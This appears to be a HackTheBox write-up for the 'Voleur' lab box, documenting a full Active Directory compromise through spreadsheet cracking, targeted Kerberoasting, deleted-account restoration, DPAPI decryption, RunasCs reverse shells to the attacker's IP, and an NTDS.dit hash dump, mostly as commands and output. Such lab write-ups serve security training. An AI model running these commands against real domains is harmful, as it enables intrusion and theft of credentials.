---
title: "Voleur - HackTheBox Writeup"
date: 2026-05-12
tags: [HTB, Windows, Medium, Active Directory, Kerberos, WriteSPN, Kerberoast, AD Tombstone, DPAPI, WSL, NTDS, RunasCs, BloodHound]
image: assets/img/posts/voleur/banner.png

---

# Voleur — HackTheBox Writeup

**Difficulty:** Medium
**OS:** Windows Server (Active Directory)
**Key Concepts:** Kerberos-only authentication, Targeted Kerberoasting (WriteSPN), AD Tombstone Object Restoration, DPAPI Credential Decryption, WSL Pivot, NTDS.dit Dump

---

## Overview

Voleur is a medium-rated Windows AD box where NTLM is completely disabled — every authentication step must go through Kerberos. We start with provided credentials for a first-line support tech, work through SMB shares to find a password-protected spreadsheet containing service account credentials, abuse WriteSPN to Kerberoast the WinRM service account, restore a tombstoned AD user via the Restore_Users group, decrypt DPAPI credential blobs to pivot laterally, and ultimately dump NTDS.dit from a backup accessible through WSL to get Domain Admin.

---

## Enumeration

### Nmap

```bash
┌──(varadkj㉿kali-vm)-[~/cybersec/boxes/discord/voleur]
└─$ nmap -p- -vv -oN nmap/voleur-open-ports 10.129.232.130

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
2222/tcp  open  EtherNetIP-1     syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
```

Standard Windows DC ports plus two interesting outliers: **port 2222** running OpenSSH 8.2p1 (Ubuntu — hinting at WSL) and **port 5985** for WinRM. No HTTP server, just another Windows box. Time to enumerate DNS, NULL logins, and authenticated access.

Detailed scan confirms the domain as `voleur.htb` with the DC hostname `dc.voleur.htb`.

### DNS Enumeration

```bash
┌──(varadkj㉿kali-vm)-[~/cybersec/boxes/discord/voleur]
└─$ dig ANY voleur.htb @voleur.htb

;; ANSWER SECTION:
voleur.htb.		600	IN	A	10.129.232.130
voleur.htb.		3600	IN	NS	dc.voleur.htb.
voleur.htb.		3600	IN	SOA	dc.voleur.htb. hostmaster.voleur.htb. 173 900 600 86400 3600

;; ADDITIONAL SECTION:
dc.voleur.htb.		3600	IN	A	10.129.232.130
```

Added both `voleur.htb` and `dc.voleur.htb` to `/etc/hosts`. Zone transfers and subdomain brute-forcing returned nothing beyond the default GC and forest domain entries.

### NTLM is Dead

As is common in real-life Windows pentests, we're given starting credentials: `ryan.naylor / HollowOct31Nyt`. NULL logins against RPC, SMB, and LDAP all failed. Trying Ryan's creds:

```bash
┌──(varadkj㉿kali-vm)-[~/cybersec/boxes/discord/voleur]
└─$ netexec smb voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' --shares
SMB  10.129.232.130  445  10.129.232.130  [-] 10.129.232.130\ryan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED
```

`STATUS_NOT_SUPPORTED` — NTLM authentication is disabled across the board. The WinRM error is even more explicit, showing the server returns non-NTLMSSP bytes where the client expects the `NTLMSSP\x00` signature. SSPs (Security Support Providers) are the suite of auth mechanisms implemented in Windows from local logon to AD environments, and this DC only speaks Kerberos.

### Setting Up Kerberos

To make our attack box Kerberos-aware for the `VOLEUR.HTB` realm:

```bash
┌──(varadkj㉿kali-vm)-[~/cybersec/boxes/discord/voleur]
└─$ cat /etc/krb5.conf
[libdefaults]
    default_realm = VOLEUR.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false

[realms]
    VOLEUR.HTB = {
        kdc = dc.voleur.htb
        admin_server = dc.voleur.htb
    }

[domain_realm]
    .voleur.htb = VOLEUR.HTB
    voleur.htb = VOLEUR.HTB
```

One key thing I learned here: with Kerberos, the **positional target** in netexec does double duty — DNS resolution *and* SPN construction. Kerberos resolves service tickets via SPNs like `cifs/DC.voleur.htb@VOLEUR.HTB`, so you always target the hostname (`dc.voleur.htb`), not the domain (`voleur.htb`). The `-d` flag is the realm. Mixing these up gives you `KDC_ERR_S_PRINCIPAL_UNKNOWN` or `KDC_ERR_WRONG_REALM`.

```bash
┌──(varadkj㉿kali-vm)-[~/cybersec/boxes/discord/voleur]
└─$ kinit ryan.naylor@VOLEUR.HTB

┌──(varadkj㉿kali-vm)-[~/cybersec/boxes/discord/voleur]
└─$ klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: ryan.naylor@VOLEUR.HTB

Valid starting       Expires              Service principal
05/11/2026 14:33:13  05/12/2026 00:33:13  krbtgt/VOLEUR.HTB@VOLEUR.HTB
```

Now we're kerbAWARE. Praying for the same for my laptimes after Fuchsröhre into Adenauer Forst.

### BloodHound Collection

```bash
┌──(varadkj㉿kali-vm)-[~/cybersec/boxes/discord/voleur]
└─$ netexec ldap dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --bloodhound -c All -d voleur.htb --dns-server 10.129.232.130
LDAP  dc.voleur.htb  389  DC  [+] voleur.htb\ryan.naylor:HollowOct31Nyt
LDAP  dc.voleur.htb  389  DC  Done in 00M 04S
```

Note the `--dns-server` flag — without it, BloodHound's collector can't resolve the DC via DNS and errors out with "Could not find a domain controller."

### SMB Shares

```bash
┌──(varadkj㉿kali-vm)-[~/cybersec/boxes/discord/voleur]
└─$ netexec smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' --shares -k -d voleur.htb
SMB  dc.voleur.htb  445  dc  Share           Permissions     Remark
SMB  dc.voleur.htb  445  dc  -----           -----------     ------
SMB  dc.voleur.htb  445  dc  ADMIN$                          Remote Admin
SMB  dc.voleur.htb  445  dc  C$                              Default share
SMB  dc.voleur.htb  445  dc  Finance
SMB  dc.voleur.htb  445  dc  HR
SMB  dc.voleur.htb  445  dc  IPC$            READ            Remote IPC
SMB  dc.voleur.htb  445  dc  IT              READ
SMB  dc.voleur.htb  445  dc  NETLOGON        READ            Logon server share
SMB  dc.voleur.htb  445  dc  SYSVOL          READ            Logon server share
```

Of course there's HR and Finance but we only have access to IT. Ryan's a first-line support tech per BloodHound, and there's a matching folder in the IT share.

```bash
┌──(varadkj㉿kali-vm)-[~/cybersec/boxes/discord/voleur]
└─$ smbclient //dc.voleur.htb/IT -U 'ryan.naylor%HollowOct31Nyt' --use-kerberos=desired

smb: \> ls
  .                                   D        0  Wed Jan 29 04:10:01 2025
  ..                                DHS        0  Thu Jul 24 16:09:59 2025
  First-Line Support                  D        0  Wed Jan 29 04:40:17 2025

smb: \First-Line Support\> ls
  Access_Review.xlsx                  A    16896  Thu Jan 30 09:14:25 2025
```

---

## Cracking the Access Review Spreadsheet

```bash
┌──(varadkj㉿kali-vm)-[~/cybersec/boxes/discord/voleur]
└─$ file Access_Review.xlsx
Access_Review.xlsx: CDFV2 Encrypted
```

CDFV2 Encrypted indicates a password-protected Microsoft Office file using the compound file binary format with MS-Office encryption. Extract the hash and send it to hashcat on my RTX 4070 Super:

```powershell
└─$ office2john Access_Review.xlsx
Access_Review.xlsx:$office$*2013*100000*256*16*a80811402788c037b50df976864b33f5*...

PS C:\Cybersec\hashcat-6.2.6> .\hashcat.exe -m 9600 .\hashes\access-hash.txt .\wordlists\rockyou.txt -d 2

$office$*2013*...:football1

Status...........: Cracked
Time.Started.....: Mon May 11 06:47:54 2026 (2 secs)
Speed.#2.........:    25872 H/s (6.39ms)
```

YEAH BUDDY LIGHTWEIGHTT!! Ain't nothin' but a peanut. Two seconds off rockyou.

### The Spreadsheet — A Goldmine

The Access Review spreadsheet is how kind of the admins — it contains a full access review table with users, roles, permissions, and critically, **plaintext passwords** for service accounts:

| User | Job Title | Permissions | Notes |
|------|-----------|-------------|-------|
| Ryan.Naylor | First-Line Support | SMB | Has Kerberos Pre-Auth disabled temporarily |
| Marie.Bryant | First-Line Support | SMB | |
| Lacey.Miller | Second-Line Support | Remote Management Users | |
| Todd.Wolfe | Second-Line Support | Remote Management Users | Leaver. Password reset to NightT1meP1dg3on14 and account deleted. |
| Jeremy.Combs | Third-Line Support | Remote Management Users | Has access to Software folder. |
| Administrator | Administrator | Domain Admin | Not to be used for daily tasks! |
| svc_backup | | Windows Backup | Speak to Jeremy! |
| svc_ldap | | LDAP Services | P/W - M1XyC9pW7qT5Vn |
| svc_iis | | IIS Administration | P/W - N5pXyW1VqM7CZ8 |
| svc_winrm | | Remote Management | Need to ask Lacey as she reset this recently. |

### Password Spray

```bash
┌──(varadkj㉿kali-vm)-[~/cybersec/boxes/discord/voleur]
└─$ netexec smb dc.voleur.htb -u users -p passwords -k -d voleur.htb --continue-on-success

SMB  dc.voleur.htb  445  dc  [+] voleur.htb\ryan.naylor:HollowOct31Nyt
SMB  dc.voleur.htb  445  dc  [+] voleur.htb\svc_ldap:M1XyC9pW7qT5Vn
```

We confirm the LDAP service account creds are valid. No new shares accessible, but this account opens up BloodHound paths.

---

## Targeted Kerberoast — WriteSPN Abuse

BloodHound reveals two key relationships:
- **svc_ldap** has **WriteSPN** over **svc_winrm**
- **svc_ldap** is a member of **Restore_Users** group

WriteSPN means we can set an arbitrary SPN on svc_winrm's account and then request a TGS for that SPN — classic targeted Kerberoast.

### Set the SPN

```bash
┌──(varadkj㉿kali-vm)-[~/cybersec/boxes/discord/voleur]
└─$ bloodyAD -d voleur.htb -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' -k --host dc.voleur.htb --dc-ip 10.129.232.130 set object svc_winrm servicePrincipalName -v 'HTTP/fake.voleur.htb'
[+] svc_winrm's servicePrincipalName has been updated
```

### Roast It

```bash
└─$ impacket-GetUserSPNs voleur.htb/svc_ldap:M1XyC9pW7qT5Vn -k -dc-host dc.voleur.htb -request -request-user svc_winrm

$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$40eac8a02a8b12e8d3b87c4892ca4385$...
```

The `$krb5tgs$23$` prefix tells us it's RC4-HMAC (etype 23) — the weakest Kerberos encryption type and the reason targeted Kerberoast works. If it were etype 17/18 (AES), cracking would be significantly slower.

### Crack It

```bash
hashcat -m 13100 svc_winrm.hash rockyou.txt

svc_winrm:AFireInsidedeOzarctica980219afi
```

Long passphrase but rockyou delivers.

---

## User Flag — Shell as svc_winrm

```powershell
┌──(varadkj㉿kali-vm)-[~/cybersec/boxes/discord/voleur]
└─$ kinit svc_winrm@VOLEUR.HTB

└─$ evil-winrm -i dc.voleur.htb -u svc_winrm -p 'AFireInsidedeOzarctica980219afi' -r VOLEUR.HTB

*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> whoami
voleur\svc_winrm
```

User flag acquired. Nothing interesting locally — no special privileges, standard domain user privs. Time to move laterally.

---

## Restoring Todd Wolfe — AD Tombstone Recovery

Remember from the spreadsheet: Todd Wolfe was a "Leaver" whose password was reset to `NightT1meP1dg3on14` and account deleted. And svc_ldap is in the **Restore_Users** group. This reminds me of a previous box — when AD objects are deleted, they go to the Tomb (the Deleted Objects container). If AD Recycle Bin is enabled, we can bring them back.

### Querying Deleted Objects

The Deleted Objects container requires the **Show Deleted Objects** LDAP control (OID `1.2.840.113556.1.4.417`) to be sent with the query — without it, the server won't even see the objects. Using simple bind (which bypasses the NTLM restriction):

```bash
┌──(varadkj㉿kali-vm)-[~/cybersec/boxes/discord/voleur]
└─$ ldapsearch -x -H ldap://dc.voleur.htb -D 'svc_ldap@voleur.htb' -w 'M1XyC9pW7qT5Vn' \
    -b 'DC=voleur,DC=htb' -s sub '(isDeleted=TRUE)' \
    -E '!1.2.840.113556.1.4.417' -o ldif-wrap=no '*'

dn: CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
objectClass: user
sAMAccountName: todd.wolfe
userPrincipalName: todd.wolfe@voleur.htb
lastKnownParent: OU=Second-Line Support Technicians,DC=voleur,DC=htb
isDeleted: TRUE
userAccountControl: 66048
```

There he is. `lastKnownParent` tells us where to restore him to.

### Restoring via PowerShell

Since svc_ldap doesn't have WinRM access, we use a PSCredential object from our svc_winrm shell to execute AD commands as svc_ldap:

```powershell
*Evil-WinRM* PS> $pass = ConvertTo-SecureString 'M1XyC9pW7qT5Vn' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('voleur.htb\svc_ldap', $pass)

Get-ADObject -Filter {sAMAccountName -eq 'todd.wolfe'} -IncludeDeletedObjects -Credential $cred | Restore-ADObject -Credential $cred
Enable-ADAccount -Identity 'todd.wolfe' -Credential $cred
```bash

Todd's back with all his group memberships intact, including **Remote Management Users** and **Second-Line Technicians**.

Note: The box periodically nukes Todd's account via a reset script, so you need to be fast. I scripted the restore + pivot to minimize the window.

---

## Pivoting with RunasCs

Even though Todd's in the Remote Management Users group, evil-winrm with Kerberos auth failed for his freshly-restored account. Local logon via RunasCs works though — `CreateProcessWithLogonW` verifies creds directly against the DC locally, bypassing the network authentication issues.

First, getting a shell as svc_ldap (useful for the restore operations):

```powershell
*Evil-WinRM* PS C:\Users\svc_winrm> .\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn powershell -r 10.10.15.45:6969
```

RunasCs with `-r` spawns a local process and pipes I/O back over TCP — no bash reverse shell syntax needed (that's a Linux thing, won't work in Windows cmd/PowerShell).

---

## DPAPI Credential Decryption

After running WinPEAS on the box, the output flagged DPAPI master keys and credential files worth investigating. Cross-referencing that with the IT share, there's a full backup of Todd's home directory sitting in the Second-Line Support folder — archived when his account was deleted. Inside it, the classic DPAPI loot:

```
C:\IT\Second-Line Support\Archived Users\todd.wolfe\Appdata\Roaming\Microsoft\Protect\S-1-5-21-...\
    08949382-134f-4c63-b93c-ce52efc0aa88    (master key)

C:\IT\Second-Line Support\Archived Users\todd.wolfe\Appdata\Roaming\Microsoft\Credentials\
    772275FAD58525253490A9B0039791D3          (credential blob)
```

Base64-encode and exfiltrate:

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\IT\Second-Line Support\Archived Users\todd.wolfe\Appdata\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110\08949382-134f-4c63-b93c-ce52efc0aa88"))

[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\IT\Second-Line Support\Archived Users\todd.wolfe\Appdata\Roaming\Microsoft\Credentials\772275FAD58525253490A9B0039791D3"))
```

### Decrypt the Master Key

The DPAPI flow: decrypt the master key using the user's password + SID, then use the decrypted master key to decrypt the credential blob.

```bash
┌──(varadkj㉿kali-vm)-[~/cybersec/boxes/discord/voleur]
└─$ impacket-dpapi masterkey -f 08949382-134f-4c63-b93c-ce52efc0aa88 \
    -sid S-1-5-21-3927696377-1337352550-2781715495-1110 \
    -password 'NightT1meP1dg3on14'

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

### Decrypt the Credential Blob

```bash
└─$ impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 \
    -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19+00:00
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m
```

Jeremy's creds: `jeremy.combs:qT3V9pLXyN7W4m`

---

## Pivoting to Jeremy

```powershell
PS C:\Users\svc_ldap> ./RunasCs.exe jeremy.combs qT3V9pLXyN7W4m powershell -r 10.10.15.45:6971
```

As a Third-Line Technician, Jeremy has access to the third-line support folder:

```powershell
PS C:\IT\third-line support> ls

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         1/30/2025   8:11 AM                Backups
-a----         1/30/2025   8:10 AM           2602 id_rsa
-a----         1/30/2025   8:07 AM            186 Note.txt.txt

PS C:\IT\third-line support> type Note.txt.txt
Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.

Please see what you can set up.

Thanks,

Admin
```

An SSH private key and a note about WSL. Port 2222 was running OpenSSH on Ubuntu — this is the WSL instance.

---

## WSL Access as svc_backup

The private key is for the svc_backup account on the WSL SSH service:

```bash
┌──(varadkj㉿kali-vm)-[~/cybersec/boxes/discord/voleur]
└─$ chmod 600 id_rsa
└─$ ssh svc_backup@voleur.htb -p 2222 -i id_rsa

svc_backup@DC:~$
```

The entire C: drive is mounted at `/mnt/c/`. Navigating to the backup folder:

```bash
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ ls -lR
.:
drwxrwxrwx 1 svc_backup svc_backup 4096 Jan 30  2025 'Active Directory'
drwxrwxrwx 1 svc_backup svc_backup 4096 Jan 30  2025  registry

'./Active Directory':
-rwxrwxrwx 1 svc_backup svc_backup 25165824 Jan 30  2025 ntds.dit
-rwxrwxrwx 1 svc_backup svc_backup    16384 Jan 30  2025 ntds.jfm

./registry:
-rwxrwxrwx 1 svc_backup svc_backup    32768 Jan 30  2025 SECURITY
-rwxrwxrwx 1 svc_backup svc_backup 18350080 Jan 30  2025 SYSTEM
```

NTDS.dit and the SYSTEM hive. Game over.

---

## Domain Admin — Dumping NTDS.dit

Exfiltrate the files via SCP:

```bash
┌──(varadkj㉿kali-vm)-[~/cybersec/boxes/discord/voleur]
└─$ scp -P 2222 -i id_rsa svc_backup@voleur.htb:"/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit" .
└─$ scp -P 2222 -i id_rsa svc_backup@voleur.htb:"/mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM" .
```

Dump every domain hash:

```bash
┌──(varadkj㉿kali-vm)-[~/cybersec/boxes/discord/voleur]
└─$ impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
```

### Getting a Shell as Administrator

Since NTLM is disabled, we can't pass-the-hash directly. Instead, use the NT hash to request a Kerberos TGT:

```bash
┌──(varadkj㉿kali-vm)-[~/cybersec/boxes/discord/voleur]
└─$ impacket-getTGT voleur.htb/Administrator -hashes :e656e07c56d831611b577b160b259ad2 -dc-ip 10.129.232.130

└─$ export KRB5CCNAME=Administrator.ccache

└─$ evil-winrm -i dc.voleur.htb -u Administrator -r VOLEUR.HTB

*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami
voleur\administrator
```

Root flag acquired. GG.

---

## Attack Chain Summary

```bash
ryan.naylor (given creds)
    │
    ├── Kerberos auth (NTLM disabled) → SMB IT share
    │       └── Access_Review.xlsx (cracked: football1)
    │               └── svc_ldap:M1XyC9pW7qT5Vn
    │
    ├── svc_ldap (WriteSPN over svc_winrm)
    │       └── Targeted Kerberoast → svc_winrm:AFireInsidedeOzarctica980219afi
    │               └── Evil-WinRM → USER FLAG
    │
    ├── svc_ldap (Restore_Users group)
    │       └── Restore tombstoned todd.wolfe (NightT1meP1dg3on14)
    │               └── DPAPI master key + credential blob decryption
    │                       └── jeremy.combs:qT3V9pLXyN7W4m
    │
    ├── jeremy.combs → Third-Line Support folder
    │       └── id_rsa + WSL note
    │               └── SSH as svc_backup (port 2222)
    │                       └── /mnt/c/ → ntds.dit + SYSTEM hive
    │
    └── secretsdump → Administrator NTLM hash
            └── getTGT → evil-winrm as Administrator → ROOT FLAG
```

---

## Key Takeaways

- **Kerberos-only environments** change everything — SPNs matter, the target hostname matters (not the domain), and you need `krb5.conf` set up correctly. The positional target in netexec is used for SPN construction when `-k` is active.
- **WriteSPN** is a powerful ACE — it enables targeted Kerberoasting by allowing you to set an arbitrary SPN on any account, request a TGS encrypted with their password hash, and crack it offline.
- **AD Recycle Bin / Tombstone recovery** is a real privilege escalation path. The `Restore_Users` group combined with the Show Deleted Objects LDAP control lets you bring back deleted accounts with known passwords.
- **DPAPI credential decryption** follows a clean two-step flow: master key (decrypted with user password + SID) → credential blob. The Roaming\Microsoft\Credentials folder holds domain-stored credentials.
- **WSL on DCs** is a massive attack surface — the entire C: drive mounted at `/mnt/c/` means any user with WSL access can read anything the Linux file permissions allow, bypassing Windows ACLs entirely.